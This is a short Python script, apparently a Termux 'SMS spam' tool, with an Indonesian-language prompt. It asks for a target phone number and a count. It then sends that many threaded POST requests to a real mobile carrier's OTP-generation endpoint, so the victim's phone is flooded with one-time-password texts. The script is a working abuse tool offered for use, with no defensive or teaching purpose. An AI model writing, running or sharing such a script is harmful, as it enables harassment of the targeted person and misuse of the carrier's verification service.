#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by @thetermuxchoice
"""
Copyright ©2019 by thetermuxchoice. All rights reserved.
https://github.com/thetermuxchoice
"""
from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nYou have not installed the request module!")
	print("$ pip install requests\n")
	exit()
  
banner=("""\033[1;36m
     _  _
   _| || |_  \033[1;32m..::SPAM SMS Tri3 UNLIMITED::..\033[1;36m
  |_  ..  _| \033[1;31mCoded by: @thetermuxchoice\033[1;36m
  |_      _| \033[1;31mGmail   : Henrycko.Developer@gmail.com\033[1;32m
    |_||_|   \033[1;31mThanks  : https://tri.co.id
    
""")

os.system('clear')
print(banner)
no = input("\033[1;37mMassukan Nomor Target =>\033[1;32m")
tot = int(input("\033[1;37mJumlah Spam =>\033[1;32m"))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SUKSES")
		else:
			print("\033[1;31m[-] GAGAL")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
